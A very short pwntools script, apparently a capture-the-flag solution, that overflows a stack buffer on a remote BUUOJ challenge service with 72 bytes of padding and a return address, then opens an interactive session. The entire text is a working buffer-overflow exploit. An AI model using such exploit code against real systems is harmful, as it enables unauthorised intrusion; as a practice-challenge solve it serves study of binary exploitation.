from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25377)

io.sendlineafter(b'>', cyclic(64+8) + p64(0x40060D))

io.interactive()